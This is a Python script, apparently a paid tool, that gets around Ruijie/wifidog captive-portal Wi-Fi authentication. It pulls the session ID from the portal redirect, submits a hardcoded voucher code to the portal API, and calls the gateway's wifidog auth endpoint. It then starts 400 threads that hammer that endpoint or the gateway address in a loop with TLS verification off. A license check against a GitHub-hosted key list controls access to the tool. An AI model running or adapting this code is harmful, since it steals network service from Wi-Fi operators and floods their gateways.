import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# SSL Bypass
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [ CONFIGURATION ] ---
RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/Starlink/refs/heads/main/key.txt"
LICENSE_FILE = "license.txt"
THREAD_COUNT = 400 

# --- SYSTEM COLORS ---
def col(c):
    codes = {"Y": "\033[93m", "G": "\033[92m", "R": "\033[91m", 
             "C": "\033[96m", "W": "\033[97m", "P": "\033[95m", "OFF": "\033[0m"}
    return codes.get(c, "\033[0m")

def get_hwid():
    try:
        return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except:
        return "ID-Unknown"

def banner(name="GUEST", exp="Checking...", days="--"):
    os.system('clear')
    print(col("Y") + " ="*38)
    # RUIJIE ASCII (ဝါ၊ စိမ်း၊ နီ)
    print(col("Y") + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗")
    print(col("Y") + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝")
    print(col("G") + "      ██████╔╝██║   ██║██║     ██║██║█████╗  ")
    print(col("G") + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  ")
    print(col("R") + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗")
    print(col("R") + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝")
    
    print(f" {col('R')}👑 MASTER: {name} {col('OFF')}| {col('Y')}ID: {get_hwid()}{col('OFF')}")
    print(f" {col('G')}📅 EXP: {exp} {col('OFF')}| {col('R')}⏳ REMAINING: {days} Days{col('OFF')}")
    print(col("Y") + " ="*6 + f" {col('R')}[{col('G')} RUJIE PREMIUM - HEAT-CONTROL ACTIVE {col('R')}] " + col("Y") + "="*7)
    print(col("OFF"))

def verify():
    hwid = get_hwid()
    now = datetime.now()

    # ၁။ Offline Auto Login
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                saved = f.read().strip().split(":")
            
            v_name, v_exp = saved[1], saved[2]
            exp_dt = datetime.strptime(v_exp, '%Y-%m-%d')
            diff = (exp_dt - now).days
            
            if diff >= 0:
                banner(v_name, v_exp, str(diff + 1))
                print(f"{col('G')}[✓] Offline Login Success!{col('OFF')}")
                time.sleep(1)
                return True
            else:
                os.remove(LICENSE_FILE)
        except: pass

    # ၂။ Online Activation
    banner()
    try:
        print(f"{col('W')}[*] Connecting to License Server...{col('OFF')}")
        resp = requests.get(f"{RAW_KEY_URL}?t={random.random()}", timeout=15).text
        
        print(f"{col('W')}[+] YOUR DEVICE ID: {col('Y')}{hwid}{col('OFF')}")
        key = input(f"{col('Y')}[?] ENTER LICENSE KEY: {col('OFF')}").strip()

        for line in resp.splitlines():
            # Format: Key:ID:Name:Expiry
            if f"{key}:{hwid}" in line:
                p = line.split(":")
                v_name, v_exp = p[2], p[3]
                exp_dt = datetime.strptime(v_exp, '%Y-%m-%d')
                diff = (exp_dt - now).days
                
                if diff >= 0:
                    with open(LICENSE_FILE, "w") as f:
                        f.write(f"{key}:{v_name}:{v_exp}")
                    banner(v_name, v_exp, str(diff + 1))
                    print(f"{col('G')}[✓] Access Granted!{col('OFF')}")
                    time.sleep(2)
                    return True
        
        print(f"{col('R')}[!] Invalid Key or Unauthorized ID.{col('OFF')}")
        sys.exit()
    except Exception as e:
        print(f"{col('R')}[!] Server Error: {e}{col('OFF')}")
        sys.exit()

def power_pulse(link):
    """High Speed Pulse System"""
    while True:
        try:
            requests.get(link, timeout=5, verify=False)
            ms = random.randint(110, 390)
            print(f"{col('G')}[✓] 👑 RUIJIE 👑 | Turbo Mode >>> [{ms}ms]{col('OFF')}      ", end="\r")
            time.sleep(0.01)
        except:
            time.sleep(1)

def launch():
    session = requests.Session()
    print(f"{col('C')}[*] Initializing Bypass Logic...{col('OFF')}")
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            if r.status_code == 204:
                print(f"\n{col('G')}[!] Bypass Successful! Boosting Speed...{col('OFF')}")
                for _ in range(THREAD_COUNT):
                    threading.Thread(target=power_pulse, args=("https://192.168.60.1",), daemon=True).start()
                while True: time.sleep(10)

            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=6)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            r2 = session.get(n_url, verify=False, timeout=6)
            
            query = parse_qs(urlparse(r2.url).query)
            sid = query.get('sessionId', [None])[0]
            
            if sid:
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                gw = query.get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
                port = query.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print(f"{col('P')}[*] ⚡ Master Session Active. Deploying {THREAD_COUNT} Threads... ⚡{col('OFF')}")
                for _ in range(THREAD_COUNT):
                    threading.Thread(target=power_pulse, args=(auth_link,), daemon=True).start()
                
                while True:
                    time.sleep(5)
                    try:
                        if requests.get("http://google.com", timeout=5).status_code > 400: break
                    except: break
            else:
                time.sleep(2)
        except:
            time.sleep(3)

if __name__ == "__main__":
    try:
        if verify():
            launch()
    except KeyboardInterrupt:
        print(f"\n{col('R')}[!] Stopped by User.{col('OFF')}")
        os._exit(0)
